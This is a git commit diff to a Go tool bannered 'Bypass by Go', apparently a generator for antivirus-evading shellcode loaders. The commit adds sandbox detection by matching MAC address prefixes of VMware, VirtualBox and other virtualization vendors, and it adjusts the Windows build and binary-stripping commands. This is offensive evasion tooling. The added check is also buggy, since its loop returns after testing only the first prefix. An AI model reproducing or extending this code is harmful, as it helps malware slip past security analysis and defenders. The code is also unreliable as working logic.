89396bb6888b4c8d14aaa78a008fd62f35f1ab8c
antiFire <108379951+awsaaaq@users.noreply.github.com>
2022-07-11 11:10:11 +0800

    Add Antivm.Change banner.Change go build command

--- main.go
+++ main.go
@@ -8,14 +8,16 @@ import (
 	"io"
 	"io/ioutil"
 	"math/rand"
+	"net"
 	"os"
 	"os/exec"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
-const Version = "1.0"
+const Version = "1.1"
 const Banner = `
 
   ____       ____  ____  
@@ -26,6 +28,7 @@ const Banner = `
 
 					
 Bypass by Go
+Author:AntiFire
 `
 
 func ShowBanner() {
@@ -59,6 +62,33 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
+var macList = []string{"00:0c:29", "00:50:56", "08:00:27", "52:54:00 ", "00:21:F6", "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D", "00:21:28", "00:01:5D", "00:21:F6", "00:A0:A4",
+	"00:07:82", "00:03:BA", "08:00:20", "2C:C2:60", "00:10:4F", "00:0F:4B", "00:13:97", "00:20:F2", "00:14:4F"}
+
+func getMacAddr() []string {
+	ifas, _ := net.Interfaces()
+
+	var as []string
+	for _, ifa := range ifas {
+		a := ifa.HardwareAddr.String()
+		if a != "" {
+			as = append(as, a)
+		}
+	}
+	return as
+}
+
+func ByMacAddress() bool {
+	return ContainsPrefix(macList, getMacAddr()[0])
+
+}
+func ContainsPrefix(s []string, macAdress string) bool {
+	for _, v := range s {
+		return strings.HasPrefix(macAdress, v)
+	}
+
+	return false
+}
 func read(file string) []byte {
 	data, err := ioutil.ReadFile(file)
 	if err != nil {
@@ -80,7 +110,7 @@ func genGoExe() {
 		return
 	}
 
-	cmd2 := exec.Command("cmd.exe", "/c", "start", "go", "build", "-ldflags", "-H windowsgui -s -w", "GOrun.go")
+	cmd2 := exec.Command("cmd.exe", "/c", "start", "go", "build", "-ldflags", "-s -w", "GOrun.go")
 	var stderr2 bytes.Buffer
 	cmd2.Stderr = &stderr2
 	cmd2.Dir = "GoBPTemp"
@@ -97,7 +127,7 @@ func genGoExe() {
 		fmt.Println(stderr3.String())
 		return
 	}
-	os.RemoveAll("./GoBPTemp")
+	//os.RemoveAll("./GoBPTemp")
 
 	cmd_go_strip := exec.Command("cmd.exe", "/c", "go-strip.exe -f ..\\GoBP.exe -a -output ..\\GoBP.exe")
 
